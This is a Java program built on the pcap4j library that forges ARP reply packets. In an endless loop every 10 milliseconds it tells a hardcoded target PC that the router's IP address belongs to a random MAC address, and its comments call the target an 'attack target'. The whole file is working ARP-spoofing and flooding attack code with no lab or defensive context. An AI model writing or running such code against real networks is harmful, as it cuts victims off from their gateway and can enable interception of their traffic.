import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Random;
import org.pcap4j.core.BpfProgram.BpfCompileMode;
import org.pcap4j.core.NotOpenException;
import org.pcap4j.core.PcapHandle;
import org.pcap4j.core.PcapNativeException;
import org.pcap4j.core.PcapNetworkInterface;
import org.pcap4j.core.PcapNetworkInterface.PromiscuousMode;
import org.pcap4j.packet.ArpPacket;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.namednumber.ArpHardwareType;
import org.pcap4j.packet.namednumber.ArpOperation;
import org.pcap4j.packet.namednumber.EtherType;
import org.pcap4j.util.ByteArrays;
import org.pcap4j.util.MacAddress;
import org.pcap4j.util.NifSelector;


public class macFlooding {

	//dstIp and dstMac: attack target 
	//srcIp: to which the attack target wants to send data
	//srcMac: attacker    
    public static Packet createArpReply(InetAddress srcIp, MacAddress srcMac, InetAddress dstIp, MacAddress dstMac) throws UnknownHostException {

		//Arp packet payload
	      ArpPacket.Builder arpBuilder = new ArpPacket.Builder()
	          .hardwareType(ArpHardwareType.ETHERNET)
	          .protocolType(EtherType.IPV4)
	          .hardwareAddrLength((byte)MacAddress.SIZE_IN_BYTES)
	          .protocolAddrLength((byte)ByteArrays.INET4_ADDRESS_SIZE_IN_BYTES)
	          .operation(ArpOperation.REPLY)
	          .srcHardwareAddr(srcMac)
	          .srcProtocolAddr(srcIp)
	          .dstHardwareAddr(dstMac)
	          .dstProtocolAddr(dstIp);

        
        EthernetPacket.Builder etherBuilder = new EthernetPacket.Builder()
                .dstAddr(dstMac)
                .srcAddr(srcMac)
                .type(EtherType.ARP)
                .payloadBuilder(arpBuilder)
                .paddingAtBuild(true);

        
        return etherBuilder.build();
    }
	
	// generate random MACAddress
	public static MacAddress randomMACAddress(){
	    Random rand = new Random();
	    byte[] macAddr = new byte[6];
	    rand.nextBytes(macAddr);
	    macAddr[0] = (byte)(macAddr[0] & (byte)254); 
	    return MacAddress.getByAddress(macAddr);
	}
	
    public static void main(String[] args) throws PcapNativeException, UnknownHostException, NotOpenException, InterruptedException {

        PcapNetworkInterface nif = null;
        try {
            nif = new NifSelector().selectNetworkInterface();
        } catch (Exception e) {
        	
        }
        if (nif == null) return;

       
        PcapHandle handle = new PcapHandle.Builder(nif.getName())
				.snaplen(65535)			// 2^16
				.promiscuousMode(PromiscuousMode.PROMISCUOUS)
				.timeoutMillis(100)		// ms
				.bufferSize(1024*1024) // 1 MB 
				.build();
        
        String filter = "arp";
		handle.setFilter(filter, BpfCompileMode.OPTIMIZE);
		    
        while (true) {

            Packet packet = macFlooding.createArpReply(
            		InetAddress.getByName("192.168.2.254"), //ip of the router
                    randomMACAddress(),
                    InetAddress.getByName("192.168.2.11"), //ip of attack target PC
                    MacAddress.getByName("00:f4:b9:5c:ed:3a") //mac address of attack target PC
            );
            System.out.println(packet);
            handle.sendPacket(packet);
            // send it every 0.01 second
            Thread.sleep(10);

        }

    }

}